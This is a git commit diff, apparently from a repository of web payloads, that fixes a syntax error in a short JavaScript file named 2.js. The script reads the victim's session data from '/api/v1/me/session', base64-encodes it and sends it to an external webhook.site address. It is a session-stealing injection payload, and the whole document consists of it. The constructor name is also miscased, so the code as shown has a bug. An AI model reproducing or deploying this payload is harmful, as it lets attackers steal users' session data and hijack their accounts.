dc11492de42704b436201d82cb1d3cab93fec4a3
Verycube <54436842+henkka008@users.noreply.github.com>
2025-06-24 15:41:56 +0300

    Update 2.js

--- 2.js
+++ 2.js
@@ -1,6 +1,6 @@
 var xhr = new XMLhttpRequest();
 xhr.open('GET', '/api/v1/me/session', true);
-xhr.onload = function {
+xhr.onload = function() {
   if (xhr.status === 200) {
     fetch('https://webhook.site/cc677157-f70d-4a1c-a37b-2734b4c54ef7?x=' + btoa(xhr.responseText) );
   }
